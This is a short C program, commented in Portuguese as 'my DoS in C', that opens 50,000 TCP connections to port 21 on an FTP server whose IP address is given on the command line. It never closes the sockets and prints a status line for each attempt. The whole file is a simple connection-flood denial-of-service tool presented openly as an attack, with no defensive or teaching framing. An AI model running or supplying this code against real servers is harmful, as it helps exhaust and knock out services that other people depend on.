//Meu DoS em c
#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main (int argc, char * argv[]){
        int meusocket;
        int conecta;

        int a;
        char * destino;
        destino = argv[1];

        struct sockaddr_in alvo;

        for (a = 0;a<50000;a++){
        meusocket = socket(AF_INET,SOCK_STREAM, 0);
        alvo.sin_family = AF_INET;
        alvo.sin_port = htons(21);
        alvo.sin_addr.s_addr = inet_addr(destino);

        conecta = connect(meusocket, (struct sockaddr*)&alvo, sizeof alvo);

        if(conecta == 0) {
                printf("Conectando no servidor FTP \n");
        }else{
                printf("Not working yet \n");
        }
        }
}
